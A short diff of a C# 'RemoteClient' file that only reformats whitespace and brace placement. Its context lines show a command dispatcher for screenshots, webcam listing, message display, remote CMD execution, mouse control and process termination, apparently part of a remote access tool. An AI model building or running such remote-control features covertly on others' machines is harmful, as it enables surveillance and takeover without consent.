@@ -564,9 +564,6 @@ namespace RemoteClient
                  Debug.WriteLine($"Error capturing screenshot: {ex.Message}");
              }
          }
-
-
-
             else if (o.CommandType == "Webcam")
             {
                 if (o.CommandName == "List")
@@ -664,8 +661,7 @@ namespace RemoteClient
             {
                 if (o.CommandName == "show") ShowMessage(o.CommandData);
             }
-            else if (o.CommandType == "CMD")
-            {
+            else if (o.CommandType == "CMD"){
                 try
                 {
                     switch (o.CommandName)
@@ -692,7 +688,6 @@ namespace RemoteClient
                 }
                     
             }
-
             else if (o.CommandType == "Mouse")
             {
                 MouseParser(o.CommandData, bool.Parse(o.CommandName));
@@ -769,8 +764,7 @@ namespace RemoteClient
                         break;
                 }
             }
-            else if (o.CommandType == "ProcessExit")
-            {
+            else if (o.CommandType == "ProcessExit"){
                 try
                 {
                     // Ensure the command data is valid
